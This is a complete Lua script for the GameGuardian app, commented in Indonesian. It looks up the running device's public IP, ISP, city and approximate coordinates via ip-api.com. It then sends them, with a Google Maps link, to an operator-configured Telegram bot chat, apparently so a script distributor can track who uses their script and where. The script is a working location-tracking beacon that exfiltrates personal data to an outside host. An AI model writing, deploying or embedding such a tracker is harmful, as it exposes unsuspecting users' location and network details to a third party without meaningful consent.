-- [[ CONFIGURATION - EDIT YOUR TELEGRAM CREDENTIALS HERE ]]
local BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
local CHAT_ID = "YOUR_CHAT_ID_HERE"

-- [[ JULES-CORE ADVANCED NOTIFIER ]]
-- Fitur: IP Tracking, Geolocation, Time/Date, Google Maps Link

local function get_location()
    gg.toast("Mengambil data lokasi akurat...")
    -- Menggunakan ip-api.com newline format untuk parsing mudah tanpa library JSON
    local url = "http://ip-api.com/line/?fields=status,country,regionName,city,lat,lon,isp,query"
    local response = gg.makeRequest(url)

    if not response or response.code ~= 200 then
        return nil, "Gagal mengambil data geolocation."
    end

    local lines = {}
    for line in response.content:gmatch("[^\r\n]+") do
        table.insert(lines, line)
    end

    if lines[1] ~= "success" then
        return nil, "Layanan geolocation error."
    end

    return {
        country = lines[2] or "Tidak diketahui",
        region  = lines[3] or "Tidak diketahui",
        city    = lines[4] or "Tidak diketahui",
        lat     = lines[5] or "0",
        lon     = lines[6] or "0",
        isp     = lines[7] or "Tidak diketahui",
        ip      = lines[8] or "Tidak diketahui"
    }
end

local function send_report()
    local timestamp_date = os.date("%Y-%m-%d")
    local timestamp_time = os.date("%H:%M:%S")

    local loc, err = get_location()

    local ip = loc and loc.ip or "Unknown"
    local city = loc and loc.city or "Unknown"
    local region = loc and loc.region or "Unknown"
    local country = loc and loc.country or "Unknown"
    local isp = loc and loc.isp or "Unknown"
    local lat = loc and loc.lat or "0"
    local lon = loc and loc.lon or "0"

    local maps_link = "https://www.google.com/maps?q=" .. lat .. "," .. lon

    -- Membangun pesan dengan format HTML untuk tampilan tabel yang rapi
    local message = "<b>[ JULES-CORE SYSTEM REPORT ]</b>\n" ..
                    "<code>" ..
                    "┌──────────────────────────────┐\n" ..
                    "│ STATUS    : ACTIVE           │\n" ..
                    "│ WAKTU     : " .. timestamp_time .. "         │\n" ..
                    "│ TANGGAL   : " .. timestamp_date .. "       │\n" ..
                    "├──────────────────────────────┤\n" ..
                    "│ IP        : " .. ip .. "\n" ..
                    "│ KOTA      : " .. city .. "\n" ..
                    "│ WILAYAH   : " .. region .. "\n" ..
                    "│ NEGARA    : " .. country .. "\n" ..
                    "│ ISP       : " .. isp .. "\n" ..
                    "├──────────────────────────────┤\n" ..
                    "│ LAT       : " .. lat .. "\n" ..
                    "│ LON       : " .. lon .. "\n" ..
                    "└──────────────────────────────┘</code>\n\n" ..
                    "📍 <b>Lokasi:</b> <a href=\"" .. maps_link .. "\">Buka di Google Maps</a>\n" ..
                    "<i>notifikasi script di gunakan oleh IP ini</i>"

    local tgUrl = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage"
    local headers = {
        ["Content-Type"] = "application/json"
    }

    -- Escape double quotes untuk body JSON
    local escaped_message = message:gsub('"', '\\"')
    -- Menghapus line breaks literal dan menggantinya dengan \n untuk JSON
    escaped_message = escaped_message:gsub('\n', '\\n')

    local body = '{"chat_id": "' .. CHAT_ID .. '", "text": "' .. escaped_message .. '", "parse_mode": "HTML", "disable_web_page_preview": false}'

    gg.toast("Mengirim laporan ke Telegram...")
    local res = gg.makeRequest(tgUrl, headers, body)

    if res and res.code == 200 then
        gg.alert("Laporan Sistem Berhasil Dikirim.\nIP: " .. ip)
    else
        local error_info = "Gagal mengirim laporan."
        if res then error_info = error_info .. " (Code: " .. res.code .. ")" end
        gg.alert(error_info .. "\nPastikan Token & Chat ID sudah benar.")
    end
end

send_report()
